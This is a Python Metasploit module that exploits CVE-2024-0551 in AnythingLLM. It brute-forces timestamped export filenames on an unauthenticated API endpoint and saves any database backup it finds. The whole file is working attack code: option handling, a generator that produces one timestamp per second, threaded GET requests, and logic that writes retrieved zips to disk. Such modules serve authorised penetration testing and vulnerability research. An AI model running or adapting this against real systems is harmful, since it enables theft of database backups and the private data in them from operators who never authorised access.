#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# https://docs.metasploit.com/docs/development/developing-modules/external-modules/writing-external-python-modules.html

# standard modules
import logging
import concurrent.futures
from urllib.parse import urljoin
from datetime import datetime, timedelta
from itertools import islice

# extra modules
dependencies_missing = False
try:
    import requests
except ImportError:
    dependencies_missing = True

from metasploit import module

metadata = {
    'name': 'AnythingLLM Database Export Bruteforce',
    'description': '''
        AnythingLLM creates database exports with predictible names and does not enforce authentication on the API endpoint to retrieve them.
        This module bruteforces names in a specific time range to try and retreive the DB backup.
    ''',
    'authors': [
        'dastaj' # Vuln discovery
        'byt3bl33d3r <marcello@protectai.com>' # MSF Module
    ],

    'rank': 'excellent',
    'date': '2024-01-12',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://huntr.com/bounties/f114c787-ab5f-4f83-afa5-c000435efb78/'},
        {'type': 'cve', 'ref': 'CVE-2024-0551'}
    ],
    'type': 'single_scanner',
    'options': {
        'rhost': {'type': 'address', 'description': 'Target address', 'required': True, 'default': None},
        'rport': {'type': 'port', 'description': 'Target port (TCP)', 'required': True, 'default': 3001},
        'bruteforce_threads': {'type': 'int', 'description': 'Max number of concurrent threads', 'required': True, 'default': 10},
        'url_path': {'type': 'string', 'description': 'URL Path', 'required': False, 'default': '/api/system/data-exports/'},
        'hours': {'type': 'int', 'description': 'Hour Timestamps to search through', 'required': True, 'default': 6},
        'ssl': {'type': 'bool', 'description': 'Negotiate SSL/TLS for outgoing connections', 'required': True, 'default': False}
    }
}

def convert_args_to_correct_type(args):
    '''
    Utility function to correctly "cast" the modules options to their correct types according to the options.

    When a module is run using msfconsole, the module args are all passed as strings
    so we need to convert them manually. I'd use pydantic but want to avoid extra deps.
    '''

    corrected_args = {}

    for k,v in args.items():
        option_to_convert = metadata['options'].get(k)
        if option_to_convert:
            type_to_convert = metadata['options'][k]['type']
            if type_to_convert == 'bool':
                if isinstance(v, str):
                    if v.lower() == 'false':
                        corrected_args[k] = False
                    elif v.lower() == 'true':
                        corrected_args[k] = True

            if type_to_convert == 'port' or type_to_convert == 'int':
                corrected_args[k] = int(v)

    return {**args, **corrected_args}

def datetime_range_gen(hours: int = 6):
    # Define the start and end of your date range
    end_date = datetime.now()
    start_date = end_date - timedelta(hours=hours)

    # Initialize the current date to the start date
    current_date = start_date

    # Iterate over each second in the date range
    while current_date < end_date:
        yield current_date.strftime("%Y-%m-%d-%H:%M:%S")
        current_date += timedelta(seconds=1)

def batcher(iterable, batch_size):
    #iterator = iter(iterable)
    while batch := list(islice(iterable, batch_size)):
        for v in batch:
            yield v

def bruteforce_thread(url: str, datestr: str):
    url = url + f"anythingllm-export-{datestr}.zip"
    r = requests.get(url, timeout=5)
    return r.status_code, r.content

def run(args):
    args = convert_args_to_correct_type(args)

    module.LogHandler.setup(msg_prefix=f"{args['rhost']} - ")

    logging.debug(args)
    if dependencies_missing:
        logging.error('Module dependency (requests) is missing, cannot continue')
        return

    MAX_WORKERS = args['bruteforce_threads']
    hours = args['hours']
    base_url = f"{'https' if args['ssl'] else 'http'}://{args['rhost']}:{args['rport']}"
    url = urljoin(base_url, args['url_path'])

    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        future_to_date = {executor.submit(bruteforce_thread, url, datestr): datestr for datestr in batcher(datetime_range_gen(hours), MAX_WORKERS)}
        for future in concurrent.futures.as_completed(future_to_date, timeout=MAX_WORKERS):
            datestr = future_to_date[future]
            try:
                status_code, content = future.result()
            except Exception as exc:
                logging.error(f"{datestr} generated an exception: {exc}")
            else:
                logging.info(f"Status: {status_code}, File: anythingllm-export-{datestr}.zip")
                if status_code == 200:
                    logging.info("Found db backup! Saving to disk")
                    with open(f"anythingllm-export-{datestr}.zip", 'wb') as f:
                        f.write(content)

    logging.info("Completed")

if __name__ == '__main__':
    module.run(metadata, run)
